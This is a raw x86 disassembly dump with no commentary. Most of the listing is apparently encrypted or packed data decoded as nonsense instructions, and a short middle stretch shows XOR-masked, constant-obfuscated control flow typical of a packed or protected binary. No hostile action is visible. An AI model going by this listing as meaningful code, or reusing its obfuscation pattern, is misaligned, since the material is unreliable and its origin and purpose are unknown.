  41322b:	outs   dx,DWORD PTR ds:[esi]
  41322c:	xchg   BYTE PTR [ebx],ah
  41322e:	cmp    DWORD PTR [eax+0x1525c99b],edx
  413234:	aas    
  413235:	mov    ebx,0x16d930e1
  41323a:	add    ecx,edi
  41323c:	xchg   ebx,eax
  41323d:	adc    ebx,DWORD PTR [eax]
  41323f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413240:	mov    ah,0xf7
  413242:	jae    0x41327b
  413244:	and    eax,0x156716cb
  413249:	fisttp WORD PTR [ecx+0x33a50509]
  41324f:	(bad)  
  413251:	push   eax
  413252:	push   eax
  413253:	cmp    DWORD PTR [ebx*4+0x35e05e3],ebp
  41325a:	shl    ebp,1
  41325c:	ret    
  41325d:	mov    ch,0x39
  41325f:	push   0x3c
  413261:	into   
  413262:	xchg   edi,eax
  413263:	mov    dh,0x6b
  413265:	push   ss
  413266:	mov    dl,0x98
  413268:	sbb    ch,BYTE PTR [ecx-0x57]
  41326b:	das    
  41326c:	mov    ch,0x74
  41326e:	mov    eax,DWORD PTR [ebx-0x3dd9b80d]
  413274:	in     al,0xb4
  413276:	push   0x5d803c2a
  41327b:	ja     0x4132dc
  41327d:	mov    cl,0x3a
  41327f:	mov    ch,0x95
  413281:	push   edx
  413282:	mov    WORD PTR [esi+0x4],?
  413285:	inc    edx
  413286:	pushf  
  413287:	jne    0x4132bd
  413289:	mov    DWORD PTR [edx-0x33],ebx
  41328c:	inc    esp
  41328d:	js     0x413288
  41328f:	sbb    al,0x4c
  413291:	loop   0x413292
  413293:	jg     0x413243
  413295:	cmp    edx,DWORD PTR [esi+ebp*8]
  413298:	pop    ebx
  413299:	push   ebp
  41329a:	jno    0x4132e6
  41329c:	(bad)  
  41329e:	xchg   ecx,eax
  41329f:	xor    esi,DWORD PTR [esi-0x1d]
  4132a2:	inc    esi
  4132a3:	sar    bh,0x3a
  4132a6:	inc    esp
  4132a7:	nop
  4132a8:	test   BYTE PTR [esi+0x4f4a15cf],ah
  4132ae:	push   esp
  4132af:	pop    ecx
  4132b0:	lods   al,BYTE PTR ds:[esi]
  4132b1:	in     al,0x5d
  4132b3:	push   ecx
  4132b4:	sub    ebx,DWORD PTR [edx+0x6dae6ddd]
  4132ba:	pop    es
  4132bb:	hlt    
  4132bc:	dec    edx
  4132bd:	test   BYTE PTR [ebp-0x39693ba3],al
  4132c3:	pop    ebx
  4132c4:	(bad)  
  4132c5:	imul   esi,edx,0x40d54f4
  4132cb:	push   edx
  4132cc:	cmp    DWORD PTR [ebx+0x7709620e],ebp
  4132d2:	sbb    esp,DWORD PTR [ebp-0x6a55aad6]
  4132d8:	cwde   
  4132d9:	push   edi
  4132db:	in     eax,dx
  4132dc:	jbe    0x41334d
  4132de:	pusha  
  4132df:	rcl    BYTE PTR [ebp+edx*4-0x49],1
  4132e3:	xlat   BYTE PTR ds:[ebx]
  4132e4:	inc    ecx
  4132e5:	cli    
  4132e6:	cdq    
  4132e7:	sbb    ah,al
  4132e9:	jecxz  0x413351
  4132eb:	mov    ebp,0x73b36964
  4132f0:	mov    cl,BYTE PTR [edx+ebp*4+0x31bd990c]
  4132f7:	lds    esp,FWORD PTR [ecx]
  4132f9:	(bad)  
  4132fa:	loop   0x4132f0
  4132fc:	hlt    
  4132fd:	mov    ecx,0x191a1d0d
  413302:	cmp    al,bl
  413304:	mov    BYTE PTR [eax-0x4],cl
  413307:	pop    edi
  413308:	sub    BYTE PTR [eax-0x38],ch
  41330b:	jmp    0x97f3:0x95806113
  413312:	cmp    eax,0x5092d82f
  413317:	(bad)  
  413318:	(bad)  
  413319:	cli    
  41331a:	pushf  
  41331b:	int3   
  41331c:	jno    0x4132d9
  41331e:	cmp    BYTE PTR [ebx+0xb396120],0xd4
  413325:	les    esp,FWORD PTR [edi+0x64]
  413328:	scas   eax,DWORD PTR es:[edi]
  413329:	(bad)  
  41332a:	fstp   st(7)
  41332c:	les    eax,FWORD PTR [ecx+0x5e3b4caf]
  413332:	lahf   
  413333:	mov    esp,DWORD PTR [edi+0x3e9d85af]
  413339:	js     0x4133a6
  41333b:	or     bh,bl
  41333d:	push   edi
  41333e:	push   ebx
  41333f:	jbe    0x4132e1
  413341:	xor    al,BYTE PTR [ecx-0x28925041]
  413347:	mov    ebx,0x2b6f228b
  41334c:	jae    0x4133bb
  41334e:	mov    esp,0xd3d7bcd8
  413353:	icebp  
  413354:	add    eax,0x484c5396
  413359:	imul   edx,DWORD PTR [ecx+0x67],0x9c2e07e4
  413360:	stc    
  413361:	sbb    al,0x76
  413363:	pop    ebx
  413364:	cmc    
  413365:	(bad)  
  413366:	or     cl,BYTE PTR [esi]
  413368:	std    
  413369:	imul   BYTE PTR [edx-0x14e7e904]
  41336f:	loopne 0x413399
  413371:	pop    eax
  413372:	mov    cl,0xab
  413374:	outs   dx,BYTE PTR ds:[esi]
  413375:	xor    eax,ebx
  413377:	adc    eax,0x6245149a
  41337c:	dec    BYTE PTR [ecx+0x165fde6e]
  413382:	(bad)  
  413383:	xchg   ecx,eax
  413384:	pop    esp
  413385:	xchg   edx,eax
  413386:	pop    edx
  413387:	xor    dh,ah
  413389:	ja     0x413329
  41338b:	leave  
  41338c:	mov    ds:0x17feaf5d,al
  413391:	or     BYTE PTR [ebx-0x166546e3],ah
  413397:	add    dl,0xa9
  41339a:	xchg   esp,eax
  41339b:	(bad)  
  41339c:	mov    ebx,0x36645cbf
  4133a1:	jbe    0x41338c
  4133a3:	or     al,0xb6
  4133a5:	sub    eax,0x2833b1ed
  4133aa:	bound  esp,QWORD PTR [ecx]
  4133ac:	rol    BYTE PTR [edi+0x55aae3d1],cl
  4133b2:	mov    esp,0x38b73e83
  4133b7:	push   0xffffffc8
  4133b9:	icebp  
  4133ba:	fs pop edi
  4133bc:	icebp  
  4133bd:	xchg   esi,eax
  4133be:	in     al,dx
  4133bf:	out    0x3c,al
  4133c1:	ret    0x42f1
  4133c4:	popa   
  4133c5:	outs   dx,BYTE PTR ds:[esi]
  4133c6:	jmp    DWORD PTR [ecx+0x37]
  4133c9:	retf   0x6808
  4133cc:	in     al,0x45
  4133ce:	sbb    eax,0xaad78514
  4133d3:	lds    edx,FWORD PTR [ebx+0x3e]
  4133d6:	enter  0xf7ec,0xca
  4133da:	std    
  4133db:	push   0x4070488e
  4133e0:	test   eax,0x521278d6
  4133e5:	sbb    DWORD PTR [esi-0x5848b088],0x10502ffe
  4133ef:	or     al,0x8d
  4133f1:	aas    
  4133f2:	pop    ecx
  4133f3:	xchg   ebp,eax
  4133f4:	push   es
  4133f5:	in     eax,0xc3
  4133f7:	add    BYTE PTR [edx],bl
  4133f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133fa:	mov    dl,0x1b
  4133fc:	call   0x56c0:0x700f31e9
  413403:	xchg   ebx,eax
  413404:	test   al,0x18
  413406:	std    
  413407:	mov    ah,0xed
  413409:	fsubr  st(1),st
  41340b:	and    dl,BYTE PTR [esi-0xace2d4f]
  413411:	sbb    al,0x75
  413413:	push   ecx
  413414:	push   edi
  413415:	jle    0x4133e0
  413417:	dec    ebp
  413418:	test   DWORD PTR [eax],edi
  41341a:	jmp    0x4133e8
  41341c:	mov    al,0x1b
  41341e:	inc    esp
  41341f:	xchg   edx,eax
  413420:	stc    
  413421:	enter  0x4d72,0x9a
  413425:	and    dh,BYTE PTR [esi-0x17]
  413428:	or     ebx,edi
  41342a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41342b:	push   DWORD PTR [eax-0x1fab3343]
  413431:	push   ebx
  413432:	fs call 0x971790ec
  413438:	jmp    0x4134b2
  41343a:	xor    al,0x25
  41343d:	addr16 je 0x4134bb
  413440:	cmp    al,0x82
  413442:	gs int3 
  413444:	ja     0x4133cb
  413446:	xchg   edi,eax
  413447:	in     al,0x4a
  413449:	mov    dl,al
  41344b:	dec    eax
  41344c:	outs   dx,BYTE PTR ds:[esi]
  41344d:	retf   0x23c0
  413450:	jle    0x413464
  413452:	ds dec esi
  413454:	mov    dh,0x88
  413456:	test   eax,0x52be38cb
  41345b:	and    BYTE PTR [esi],dh
  41345d:	(bad)  
  41345e:	fldcw  WORD PTR [eax]
  413460:	ficomp WORD PTR [ebx-0x70]
  413463:	fcmovb st,st(5)
  413465:	(bad)  
  413466:	or     eax,0x98f5a9ac
  41346b:	mov    eax,ecx
  41346d:	pop    esi
  41346e:	in     al,0x26
  413470:	and    edi,edx
  413472:	sahf   
  413473:	and    edx,DWORD PTR [eax+0x14]
  413476:	sti    
  413477:	xchg   ebx,eax
  413478:	sub    eax,0x88beb05a
  41347d:	or     BYTE PTR [edi+ebx*8-0x646ca96e],dl
  413484:	shl    BYTE PTR [ebp-0x5e],1
  413487:	test   eax,0x4baea417
  41348c:	jne    0x413498
  41348e:	scas   eax,DWORD PTR es:[edi]
  41348f:	mov    eax,0xbd137eb0
  413494:	mov    ecx,0x697f8bd2
  413499:	scas   eax,DWORD PTR es:[edi]
  41349a:	mov    ah,0x36
  41349c:	int    0xf9
  41349e:	fscale 
  4134a0:	adc    al,0x13
  4134a2:	jb     0x4134ab
  4134a4:	sbb    al,0x7c
  4134a6:	dec    ecx
  4134a7:	(bad)  
  4134a8:	fsub   st,st(5)
  4134aa:	mov    bl,0xf3
  4134ac:	jbe    0x413435
  4134ae:	cmp    ah,BYTE PTR [ecx+edx*8-0x3e]
  4134b2:	adc    eax,edx
  4134b4:	lahf   
  4134b5:	push   ss
  4134b6:	sub    DWORD PTR [ebp+0x43],0x948e571e
  4134bd:	sbb    BYTE PTR [ebx+0x212271cb],cl
  4134c3:	pop    ds
  4134c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134c5:	repnz sti 
  4134c7:	sub    al,0x38
  4134c9:	(bad)  
  4134ca:	mov    esi,0x3596dc8
  4134cf:	repnz mov dl,0x11
  4134d2:	lahf   
  4134d3:	sub    BYTE PTR [edi+0x67],dh
  4134d6:	push   0xe97fc015
  4134db:	in     eax,dx
  4134dc:	xchg   DWORD PTR [ebx-0x6],ebp
  4134df:	and    BYTE PTR [eax],cl
  4134e1:	dec    esi
  4134e2:	sbb    eax,0x96ec00f6
  4134e7:	mov    dh,0xd3
  4134e9:	dec    edi
  4134ea:	cmc    
  4134eb:	idiv   DWORD PTR ds:0x3815ee2
  4134f1:	xor    eax,0x981f9cfc
  4134f6:	sar    DWORD PTR [edi],0xec
  4134f9:	std    
  4134fa:	clc    
  4134fb:	fisttp WORD PTR [edi]
  4134fd:	mov    fs,WORD PTR [ecx+0x785c6f6a]
  413503:	mov    ecx,0xc515bd63
  413508:	out    0x11,al
  41350a:	mov    al,0xdc
  41350c:	cmp    esi,DWORD PTR [ebp-0x740e5742]
  413512:	push   ebp
  413513:	fwait
  413514:	mov    esi,0x7d7fc763
  413519:	push   ebx
  41351a:	imul   ecx,DWORD PTR [ebx],0x112e7275
  413520:	jo     0x4134e4
  413522:	mov    ch,BYTE PTR ds:0xaf66c7b2
  413528:	mov    esi,0xa10acb32
  41352d:	xchg   DWORD PTR [edx*8+0x35834b85],eax
  413534:	rol    BYTE PTR [ebx-0x4e],cl
  413537:	mov    ds:0x8bb6831a,eax
  41353c:	ja     0x413550
  41353e:	pusha  
  41353f:	sbb    DWORD PTR [esi],eax
  413541:	push   eax
  413542:	or     al,0xd7
  413544:	mov    dl,0x25
  413546:	and    al,0x0
  413548:	pop    ebp
  413549:	rol    DWORD PTR [esi+0x8],1
  41354c:	imul   eax,DWORD PTR [eax+0x7c360333],0x37
  413553:	or     ebp,DWORD PTR [ebp+edx*4+0x37021d2d]
  41355a:	aam    0xf3
  41355c:	outs   dx,BYTE PTR ds:[esi]
  41355d:	lahf   
  41355e:	call   0xc6fa5fec
  413563:	xor    al,0xde
  413565:	les    esp,FWORD PTR [esi-0x22]
  413568:	pop    ebp
  413569:	dec    edi
  41356a:	xor    esp,esp
  41356c:	cmp    eax,0x7f0f7110
  413571:	xchg   esp,eax
  413572:	sbb    BYTE PTR [edi],al
  413574:	out    0xbd,al
  413576:	mov    edi,0xa7ae727c
  41357b:	popf   
  41357c:	shr    esp,cl
  41357e:	int    0x5a
  413580:	push   0xffffff88
  413582:	jecxz  0x413524
  413584:	je     0x4135fd
  413586:	dec    esi
  413587:	jbe    0x413565
  413589:	ja     0x4135ac
  41358b:	mov    bl,0xbe
  41358d:	loop   0x413599
  41358f:	scas   al,BYTE PTR es:[edi]
  413590:	loopne 0x413563
  413592:	mul    BYTE PTR [edi]
  413594:	ror    BYTE PTR [ebx+eax*1+0x27072944],0x91
  41359c:	lods   eax,DWORD PTR ds:[esi]
  41359d:	xchg   ebp,eax
  41359e:	sub    al,0x10
  4135a0:	popf   
  4135a1:	scas   al,BYTE PTR es:[edi]
  4135a2:	into   
  4135a3:	xchg   ecx,eax
  4135a4:	pop    ecx
  4135a5:	and    edx,DWORD PTR [ebp-0x19a6204e]
  4135ab:	ficom  WORD PTR ds:0xd44db392
  4135b1:	pop    edi
  4135b2:	popa   
  4135b3:	pop    eax
  4135b4:	into   
  4135b5:	lea    edx,[eax]
  4135b7:	fs retf 
  4135b9:	ins    BYTE PTR es:[edi],dx
  4135ba:	xor    al,0x3d
  4135bc:	loop   0x41358c
  4135be:	inc    BYTE PTR [edi+0x3d]
  4135c1:	ret    0x187d
  4135c4:	jb     0x413595
  4135c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135c7:	stc    
  4135c8:	pushf  
  4135c9:	and    dh,BYTE PTR [ebx+edi*1-0x4f]
  4135cd:	fisttp WORD PTR [edi-0x5e9395f6]
  4135d3:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4135d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135d6:	add    DWORD PTR [esi-0x63],esi
  4135d9:	test   DWORD PTR [edi],eax
  4135db:	iret   
  4135dc:	pop    edi
  4135dd:	fdiv   st,st(2)
  4135df:	enter  0x2cd1,0xf0
  4135e3:	add    eax,0xc42c3130
  4135e8:	or     al,BYTE PTR [esi]
  4135ea:	imul   edx,ecx,0xeffd7f11
  4135f0:	jmp    0x100ce197
  4135f5:	dec    ecx
  4135f6:	mov    al,ds:0x736705c5
  4135fb:	add    BYTE PTR [ecx-0x78b2655b],cl
  413601:	mov    cl,0x1a
  413603:	mov    ebp,0x1c7b5d9
  413608:	dec    ebp
  413609:	inc    esp
  41360a:	in     eax,dx
  41360b:	jmp    0xa41233b3
  413610:	add    esp,DWORD PTR [esi-0x13]
  413613:	add    eax,0x7292c082
  413618:	dec    edx
  413619:	add    ebp,DWORD PTR [edx+0x10]
  41361c:	retf   
  41361d:	retf   0x40ce
  413620:	xchg   edi,eax
  413621:	pop    DWORD PTR [ebp-0x51]
  413624:	mov    ds:0xcf14f5da,al
  413629:	mov    eax,0xb39aca50
  41362e:	(bad)  [ebx+0x22857ef8]
  413634:	adc    edx,esi
  413636:	and    esp,DWORD PTR [edi-0x250c2d51]
  41363c:	fwait
  41363d:	shl    DWORD PTR [esp+edx*1],0xb4
  413641:	(bad)  
  413642:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413643:	cdq    
  413644:	setbe  BYTE PTR [edi-0x33870ed4]
  41364b:	(bad)  
  41364c:	clc    
  41364d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41364e:	imul   ebx,ebx,0x9a9f4f1a
  413654:	fld    QWORD PTR [ebp+0xd]
  413657:	pop    ebp
  413658:	rcl    DWORD PTR [edx],1
  41365a:	and    al,0xdb
  41365c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41365d:	mov    ds:0x8c37f2ae,eax
  413662:	or     edi,esi
  413664:	into   
  413665:	neg    BYTE PTR [ebx+eiz*2]
  413668:	mov    ?,WORD PTR [ebx+0x5422b69d]
  41366e:	scas   al,BYTE PTR es:[edi]
  41366f:	push   esi
  413670:	jp     0x413652
  413672:	shl    edi,cl
  413674:	pop    ds
  413675:	aam    0x46
  413677:	jmp    FWORD PTR [ecx]
  413679:	jno    0x41366c
  41367b:	jmp    FWORD PTR [edx+eax*2+0xc]
  41367f:	lds    esi,FWORD PTR ds:0xc6e3355c
  413685:	stos   BYTE PTR es:[edi],al
  413686:	pop    es
  413687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413688:	jb     0x4136e3
  41368a:	lods   al,BYTE PTR ds:[esi]
  41368b:	mov    dl,BYTE PTR [ecx+ebx*2+0x78d06838]
  413692:	sahf   
  413693:	rol    DWORD PTR [edx-0x6b3f5129],0x7d
  41369a:	push   ss
  41369b:	mov    dl,0x3
  41369d:	sbb    ah,BYTE PTR [esi+esi*8-0x625e39ba]
  4136a4:	repz mov al,ds:0x1b0ddeb1
  4136aa:	(bad)  
  4136ab:	dec    edi
  4136ac:	cmp    bl,0xbf
  4136af:	(bad)  
  4136b1:	mov    bh,0xa7
  4136b3:	mov    ecx,0xa7de38c8
  4136b8:	xor    edx,DWORD PTR [edi]
  4136ba:	push   ss
  4136bb:	cli    
  4136bc:	sub    BYTE PTR [ecx],bl
  4136be:	add    cl,BYTE PTR [ebx+0x33f45d8b]
  4136c4:	(bad)  
  4136c5:	add    edx,edi
  4136c7:	imul   edx,ebx
  4136ca:	mov    ebx,DWORD PTR [ebp-0x8]
  4136cd:	mov    BYTE PTR [edx+ebx*1],al
  4136d0:	mov    eax,DWORD PTR [ebp-0x30]
  4136d3:	mov    edx,DWORD PTR [ebp-0x3c]
  4136d6:	xor    eax,esi
  4136d8:	xor    edx,esi
  4136da:	add    eax,edi
  4136dc:	add    edx,edi
  4136de:	imul   eax,edx
  4136e1:	add    eax,DWORD PTR [ebp-0xc]
  4136e4:	mov    DWORD PTR [ebp-0xc],eax
  4136e7:	mov    eax,DWORD PTR [ebp-0xc]
  4136ea:	mov    edx,DWORD PTR [ebp-0x24]
  4136ed:	cmp    edx,eax
  4136ef:	jb     0x411257
  4136f5:	mov    eax,DWORD PTR [ebp-0x3c]
  4136f8:	mov    edx,DWORD PTR [ebp-0x24]
  4136fb:	xor    eax,esi
  4136fd:	add    eax,edi
  4136ff:	imul   eax,edx
  413702:	mov    edx,DWORD PTR [ebp-0x20]
  413705:	xor    edx,esi
  413707:	add    edx,edi
  413709:	or     eax,edx
  41370b:	mov    edx,DWORD PTR [ebp-0x18]
  41370e:	xor    edx,esi
  413710:	add    eax,edx
  413712:	mov    edx,DWORD PTR [ebp-0x18]
  413715:	xor    edx,esi
  413717:	add    eax,edx
  413719:	mov    edx,DWORD PTR [ebp-0x10]
  41371c:	lea    eax,[eax+edx*1+0x64e5b6]
  413723:	jmp    0x413737
  413728:	mov    eax,DWORD PTR [ebp-0x18]
  41372b:	mov    edx,DWORD PTR [ebp-0x10]
  41372e:	xor    eax,esi
  413730:	lea    eax,[eax+edx*1+0x3272db]
  413737:	mov    DWORD PTR [ebp-0x10],eax
  41373a:	jmp    0x4111a4
  41373f:	mov    eax,DWORD PTR [ebp-0x38]
  413742:	mov    edx,DWORD PTR [ebp+0xc]
  413745:	xor    edx,esi
  413747:	lea    ecx,[ecx+edx*1+0x3272db]
  41374e:	lea    edx,[ecx-0x3272db]
  413754:	xor    edx,esi
  413756:	cmp    edx,0xf89c95b6
  41375c:	jne    0x410fde
  413762:	mov    ecx,DWORD PTR [ebp+0x8]
  413765:	mov    edx,DWORD PTR [ebp+0xc]
  413768:	mov    ebx,DWORD PTR [ebp+0x8]
  41376b:	xor    edx,esi
  41376d:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  413774:	xor    ecx,esi
  413776:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41377d:	xor    ebx,esi
  41377f:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  413786:	jmp    0x415b38
  41378b:	xlat   BYTE PTR ds:[ebx]
  41378c:	repz mov bh,0xb2
  41378f:	xchg   ebx,eax
  413790:	mov    fs,WORD PTR [edi+0xef9e63]
  413796:	mov    bl,0x6c
  413798:	and    DWORD PTR [ecx],0x3c
  41379b:	mov    ds:0xcd62626b,al
  4137a0:	pop    edi
  4137a1:	bound  esp,QWORD PTR [edx+0x44]
  4137a4:	gs cmp al,0x9b
  4137a7:	inc    esp
  4137a8:	cmp    esi,ecx
  4137aa:	das    
  4137ab:	ret    0xb7c5
  4137ae:	xlat   BYTE PTR ds:[ebx]
  4137af:	dec    esp
  4137b0:	jne    0x413801
  4137b2:	jno    0x4137a1
  4137b4:	pop    ebx
  4137b5:	push   es
  4137b6:	mov    ch,0xf
  4137b8:	dec    eax
  4137b9:	mov    ebx,0x8bc05f31
  4137be:	cmp    DWORD PTR ds:0x1522cb4c,edx
  4137c4:	cmp    eax,0xbb44d77d
  4137c9:	fwait
  4137ca:	push   eax
  4137cb:	mov    ch,0x33
  4137cd:	rol    DWORD PTR [ebx],cl
  4137cf:	dec    edx
  4137d0:	mov    WORD PTR [edx],ss
  4137d2:	pop    ebp
  4137d3:	les    edi,FWORD PTR ds:0xf7bdb2ff
  4137d9:	xchg   esp,eax
  4137da:	xor    eax,0xa5021df
  4137df:	ret    
  4137e0:	popf   
  4137e1:	inc    eax
  4137e2:	xor    eax,0x52640a81
  4137e7:	xor    al,0x13
  4137e9:	aaa    
  4137ea:	xor    ch,BYTE PTR [ebx+esi*8-0x371e2636]
  4137f1:	xor    al,0xd5
  4137f3:	(bad)  
  4137f4:	mov    al,0x86
  4137f6:	or     bl,BYTE PTR [ebp-0x682127ab]
  4137fc:	add    DWORD PTR [esi],ebx
  4137fe:	add    ebp,DWORD PTR [esi]
  413800:	out    dx,eax
  413801:	arpl   WORD PTR [ebp+0x1f],si
  413804:	cmp    BYTE PTR [esi+0x11ae8429],cl
  41380a:	mov    WORD PTR [eax],gs
  41380c:	pusha  
  41380d:	sub    ebx,DWORD PTR [ebx-0x24]
  413810:	sbb    eax,0xdeaab3be
  413815:	xchg   edx,eax
  413816:	pushf  
  413817:	xchg   bh,al
  413819:	std    
  41381a:	retf   
  41381b:	repz je 0x41382c
  41381e:	xchg   DWORD PTR [edx],ebx
  413820:	jl     0x4137aa
  413822:	lods   al,BYTE PTR ds:[esi]
  413823:	in     eax,0xc1
  413825:	retf   0x8037
  413828:	xor    eax,ebx
  41382a:	mov    ds:0x5dd4d13f,eax
  41382f:	out    dx,eax
  413830:	inc    esi
  413831:	iret   
  413832:	mov    ebx,0xbbd7d76e
  413837:	and    BYTE PTR [eax+eax*8],bl
  41383a:	aas    
  41383b:	shl    DWORD PTR [ecx+0x5e2564e1],0x7a
  413842:	nop
  413843:	push   edi
  413844:	cmc    
  413845:	inc    ebx
  413846:	or     al,0xbc
  413848:	jnp    0x41381f
  41384a:	scas   eax,DWORD PTR es:[edi]
  41384b:	addr16 loopne 0x41380e
  41384e:	mov    eax,ds:0x607db2bf
  413853:	fstp   TBYTE PTR [edi+0x35]
  413856:	jnp    0x41381b
  413858:	dec    esi
  413859:	shr    DWORD PTR [ebx],cl
  41385b:	icebp  
  41385c:	enter  0x9c1f,0xa9
  413860:	and    al,0x37
  413862:	scas   al,BYTE PTR es:[edi]
  413863:	fmul   DWORD PTR [ebx+eax*2+0x7106c972]
  41386a:	ja     0x413804
  41386c:	jmp    0x33adbd28
  413871:	and    ebp,DWORD PTR [edi+0x1b2b5ccf]
  413877:	dec    ebx
  413878:	adc    DWORD PTR [edx-0x8],esi
  41387b:	dec    ebp
  41387c:	and    BYTE PTR ds:0x19424b3d,dl
  413882:	fwait
  413883:	sub    ah,al
  413885:	(bad)  
  413886:	mov    ecx,0x923a9e27
  41388b:	(bad)  [ecx+0x4b009e41]
  413891:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413892:	push   ebx
  413893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413894:	gs popw ss
  413897:	cld    
  413898:	out    dx,eax
  413899:	popa   
  41389a:	jbe    0x413917
  41389c:	jl     0x413820
  41389e:	fstp   TBYTE PTR [edx]
  4138a0:	push   ebx
  4138a1:	xor    al,0xd6
  4138a3:	gs jp  0x413868
  4138a6:	cmp    ecx,DWORD PTR [ebx]
  4138a8:	jle    0x4138ff
  4138aa:	add    eax,0x2255dc26
  4138af:	rcr    DWORD PTR [eax+edx*2],cl
  4138b2:	jl     0x4138b5
  4138b4:	sbb    al,BYTE PTR [eax+0x1e]
  4138b7:	loope  0x41383e
  4138b9:	mov    bh,0xb2
  4138bb:	push   ecx
  4138bc:	call   0x1c4ec165
  4138c1:	inc    edi
  4138c2:	push   cs
  4138c3:	xor    DWORD PTR [ecx],edx
  4138c5:	icebp  
  4138c6:	sub    BYTE PTR [ecx-0x47],0xc6
  4138ca:	fnstsw WORD PTR [esi]
  4138cc:	daa    
  4138cd:	imul   bh
  4138cf:	mov    esi,0x240e707c
  4138d4:	adc    dh,al
  4138d6:	stos   BYTE PTR es:[edi],al
  4138d7:	sbb    esi,DWORD PTR [edx-0x2f]
  4138da:	lea    esi,[ebx+0x7510f696]
  4138e0:	js     0x4138e3
  4138e2:	xor    eax,DWORD PTR [ebx+0x29]
  4138e5:	out    0xa5,eax
  4138e7:	clc    
  4138e8:	xor    esi,edx
  4138ea:	ds ret 0x2676
  4138ee:	jg     0x41392b
  4138f0:	cli    
  4138f1:	xor    al,0xfd
  4138f3:	hlt    
  4138f4:	and    al,0x2e
  4138f6:	push   ds
  4138f7:	xchg   esi,eax
  4138f8:	xchg   ebx,eax
  4138f9:	jae    0x413909
  4138fb:	mov    ecx,0x117037c3
  413900:	xor    ah,0xb2
  413903:	dec    edx
  413904:	loop   0x413901
  413906:	xchg   edi,eax
  413907:	in     eax,dx
  413908:	(bad)  
  413909:	shr    al,cl
  41390b:	rcr    DWORD PTR es:[esi],1
  41390e:	mov    ecx,0x17359fdd
  413913:	adc    eax,0xe674a236
  413918:	sbb    al,bl
  41391a:	enter  0x5cf7,0xd7
  41391e:	cmp    bl,BYTE PTR [esi]
  413920:	les    esi,FWORD PTR [edi]
  413922:	cwde   
  413923:	add    BYTE PTR [edx],ah
  413925:	adc    DWORD PTR cs:[edx-0x40],ecx
  413929:	lds    ebp,FWORD PTR [eax+0x783c3f96]
  41392f:	imul   ecx,DWORD PTR [eax],0xfffffff7
  413932:	sub    esi,DWORD PTR ds:0xcb7e17c2
  413938:	into   
  413939:	dec    ecx
  41393a:	jecxz  0x41392c
  41393c:	shl    DWORD PTR [eax+0x6cec26bc],0x7f
  413943:	popf   
  413944:	(bad)  [eax]
  413946:	inc    ebx
  413947:	or     al,0x2c
  413949:	push   esi
  41394a:	jg     0x413971
  41394c:	xchg   ebx,eax
  41394d:	push   cs
  41394e:	sub    al,BYTE PTR [edx]
  413950:	jmp    0x58811db8
  413955:	adc    ecx,DWORD PTR [edi-0x3e]
  413958:	test   ebp,ebx
  41395a:	out    dx,al
  41395b:	or     dh,BYTE PTR [esi]
  41395d:	(bad)  
  41395e:	pop    esp
  41395f:	dec    ebx
  413960:	and    BYTE PTR [ebx+0x6075445c],ah
  413966:	out    0x36,al
  413968:	ins    DWORD PTR es:[edi],dx
  413969:	retf   0x3536
  41396c:	add    BYTE PTR [esi+0x7791bc93],dl
  413972:	jle    0x4139d7
  413974:	shl    ebx,0x21
  413977:	dec    ebx
  413978:	xchg   DWORD PTR [edi+0x45],esi
  41397b:	clc    
  41397c:	cmp    eax,DWORD PTR [ebp-0x7c218c50]
  413982:	or     ebp,DWORD PTR [edx-0x64b6b591]
  413988:	push   di
  41398a:	ds push ecx
  41398c:	adc    eax,0x2b54333f
  413991:	cmp    ecx,edx
  413993:	mov    esp,0x1f492e7d
  413998:	add    BYTE PTR [ecx+eiz*4+0xb94b9e4],0x53
  4139a0:	out    dx,al
  4139a1:	xor    DWORD PTR [ecx-0x15],0x48
  4139a5:	xchg   BYTE PTR [ebx+0x15b5dd0e],bh
  4139ab:	mov    esi,0x5f513cf9
  4139b0:	jbe    0x4139a1
  4139b2:	shl    edi,1
  4139b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139b5:	repnz and eax,0xb89a9399
  4139bb:	dec    ebx
  4139bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139bd:	jno    0x41395a
  4139bf:	inc    edx
  4139c0:	sub    eax,edx
  4139c2:	adc    edi,DWORD PTR [edi+edi*1+0x78]
  4139c6:	inc    ecx
  4139c7:	fwait
  4139c8:	push   es
  4139c9:	jno    0x413a1d
  4139cb:	mov    ecx,0x56e43c08
  4139d0:	das    
  4139d1:	iret   
  4139d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139d3:	adc    BYTE PTR [ebx+0x523937ca],bl
  4139d9:	fidivr WORD PTR [eax]
  4139db:	mov    ch,0xba
  4139dd:	add    DWORD PTR cs:[ebx],ebx
  4139e0:	sti    
  4139e1:	and    al,0xaf
  4139e3:	mov    dh,0xea
  4139e5:	cld    
  4139e6:	icebp  
  4139e7:	inc    edx
  4139e8:	data16 add al,cl
  4139eb:	ss lahf 
  4139ed:	mov    ebp,0xdba75f0d
  4139f2:	int3   
  4139f3:	aam    0x40
  4139f5:	push   ds
  4139f6:	add    ecx,DWORD PTR [edi]
  4139f8:	adc    edx,DWORD PTR [ebp+edx*4+0x71]
  4139fc:	mov    eax,ds:0xcc79640b
  413a01:	jle    0x413a13
  413a03:	push   edx
  413a04:	clc    
  413a05:	mov    bl,0x5d
  413a07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a08:	xor    BYTE PTR [edx+0x7b],bl
  413a0b:	push   edi
  413a0c:	lds    edx,FWORD PTR [eax]
  413a0e:	ss mov ebp,0x59141102
  413a14:	(bad)  
  413a16:	loopne 0x4139d2
  413a18:	inc    edi
